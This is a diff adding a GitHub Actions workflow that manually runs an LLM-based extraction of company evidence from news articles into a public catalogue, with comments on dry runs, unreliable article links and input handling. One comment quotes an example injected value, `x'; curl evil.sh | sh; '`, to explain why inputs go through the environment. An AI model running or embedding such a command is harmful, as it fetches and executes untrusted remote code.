@@ -1,0 +1,79 @@
+name: Extract company evidence
+
+# Builds company_evidence rows from the news articles already linked to each
+# company — contracts, deployments, customers, partnerships, funding.
+#
+# NO SCHEDULE ON PURPOSE. This writes to a public catalogue with no human review,
+# and the article-to-company links it reads are often wrong: Lockheed Martin's
+# four most recent linked articles, checked by hand, were about a Ukrainian
+# medevac drone, UK policy, and Boeing's MQ-25. The model is told to reject those,
+# but nobody has yet seen it do so on real data.
+#
+# Run it with dry_run ticked first and read the output. Add a cron here once the
+# refusals look right.
+
+on:
+  workflow_dispatch:
+    inputs:
+      max:
+        description: "Companies this run"
+        default: "10"
+        required: true
+      concurrency:
+        description: "Parallel LLM calls"
+        default: "3"
+        required: true
+      company:
+        description: "Only companies matching this name (optional, for spot-checks)"
+        required: false
+      dry_run:
+        description: "Print what would be written, write nothing"
+        type: boolean
+        default: true
+
+permissions:
+  contents: read
+
+concurrency:
+  group: extract-evidence
+  cancel-in-progress: false
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v5
+      - uses: actions/setup-node@v5
+        with:
+          node-version: "22"
+
+      # The validation is what stands between the model and the database, so it
+      # runs before every extraction rather than only on push.
+      - name: Check the validation rules
+        run: node scripts/test-evidence.mjs
+
+      - name: Extract evidence
+        # Inputs go through the environment, never into the command line: a value
+        # like `x'; curl evil.sh | sh; '` would otherwise be run by the shell.
+        run: |
+          set -o pipefail
+          # `if` rather than `[ x ] && y`: GitHub runs these with `bash -e`, where a
+          # false test is a non-zero status and would end the step right here.
+          ARGS=(--max "$IN_MAX" --concurrency "$IN_CONCURRENCY")
+          if [ "$IN_DRY_RUN" != "false" ]; then ARGS+=(--dry-run); fi
+          if [ -n "$IN_COMPANY" ]; then ARGS+=(--company "$IN_COMPANY"); fi
+          {
+            echo '## Evidence extraction'
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+          node scripts/extract-evidence.mjs "${ARGS[@]}" | tee -a "$GITHUB_STEP_SUMMARY"
+          echo '```' >> "$GITHUB_STEP_SUMMARY"
+        env:
+          IN_MAX: ${{ github.event.inputs.max || '10' }}
+          IN_CONCURRENCY: ${{ github.event.inputs.concurrency || '3' }}
+          IN_DRY_RUN: ${{ github.event.inputs.dry_run }}
+          IN_COMPANY: ${{ github.event.inputs.company }}
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
